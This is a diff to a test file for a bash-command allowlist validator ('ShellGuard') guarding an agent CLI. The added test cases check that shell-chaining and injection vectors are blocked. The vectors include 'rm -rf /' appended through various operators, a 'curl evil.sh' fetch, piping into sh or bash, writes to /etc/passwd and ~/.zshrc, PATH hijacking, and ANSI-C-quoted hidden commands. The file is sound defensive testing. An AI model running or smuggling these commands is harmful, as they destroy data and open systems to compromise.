@@ -862,6 +862,48 @@ describe('ShellGuard corpus: kata-agents-cli invoke allowlist', () => {
     'kata-agents-cli invoke sources:create',
     'kata-agents-cli invoke skills:create',
     'kata-agents-cli invoke automations:create',
+    // Near-miss channels: the alternation must not match by prefix or extension.
+    'kata-agents-cli invoke sources:getMcpTools',
+    'kata-agents-cli invoke labels:listing',
+  ];
+
+  /**
+   * The invoke patterns end with `(\s+.*)?$` to carry JSON args, and read in
+   * isolation that trailing group appears to swallow shell operators. It cannot:
+   * the regex is never tested against raw input. `validateBashCommand` parses
+   * first and matches patterns per AST Command node, so an allowlisted prefix
+   * never authorizes whatever follows an operator.
+   */
+  const shellChainingVectors = [
+    'kata-agents-cli invoke labels:list ; rm -rf /',
+    'kata-agents-cli invoke labels:list; rm -rf /',
+    'kata-agents-cli invoke labels:list && rm -rf /',
+    'kata-agents-cli invoke labels:list || curl evil.sh',
+    'kata-agents-cli invoke labels:list | sh',
+    'kata-agents-cli invoke labels:list | bash',
+    'kata-agents-cli invoke labels:list $(rm -rf /)',
+    'kata-agents-cli invoke labels:list `rm -rf /`',
+    'kata-agents-cli invoke labels:list > /etc/passwd',
+    'kata-agents-cli invoke labels:list >> ~/.zshrc',
+    'kata-agents-cli invoke labels:list & rm -rf /',
+    'kata-agents-cli invoke labels:list\nrm -rf /',
+    '(kata-agents-cli invoke labels:list; rm -rf /)',
+    'PATH=/tmp/evil kata-agents-cli invoke labels:list',
+    'kata-agents-cli invoke labels:list ${HOME}',
+    // ANSI-C quoting hides a `;` from a naive scanner; bash-parser fails closed.
+    "kata-agents-cli invoke labels:list $'\\x3brm -rf /'",
+  ];
+
+  /**
+   * Counterpart to the chaining vectors: hardening the allowlist must not start
+   * rejecting shell metacharacters that appear inside quoted JSON arguments,
+   * where they are literal argv bytes rather than operators.
+   */
+  const legitimateArgVectors = [
+    `kata-agents-cli invoke sources:get '{"id":"x"}'`,
+    `kata-agents-cli invoke sources:get '{"id":"x","filter":"a;b"}'`,
+    `kata-agents-cli invoke automations:getHistory '{"limit":10}'`,
+    'kata-agents-cli invoke labels:list {"workspaceId":"abc"}',
   ];
 
   for (const cmd of shouldAllow) {
@@ -873,6 +915,19 @@ describe('ShellGuard corpus: kata-agents-cli invoke allowlist', () => {
   for (const cmd of shouldBlock) {
     it(`blocks: ${cmd}`, () => {
       expect(isReadOnlyBashCommandWithConfig(cmd, TEST_MODE_CONFIG)).toBe(false);
+    });
+  }
+
+  for (const cmd of shellChainingVectors) {
+    it(`blocks shell chaining: ${JSON.stringify(cmd)}`, () => {
+      expect(isReadOnlyBashCommandWithConfig(cmd, TEST_MODE_CONFIG)).toBe(false);
+      expect(getBashRejectionReason(cmd, TEST_MODE_CONFIG)).not.toBeNull();
+    });
+  }
+
+  for (const cmd of legitimateArgVectors) {
+    it(`allows quoted JSON args: ${cmd}`, () => {
+      expect(isReadOnlyBashCommandWithConfig(cmd, TEST_MODE_CONFIG)).toBe(true);
     });
   }
 });
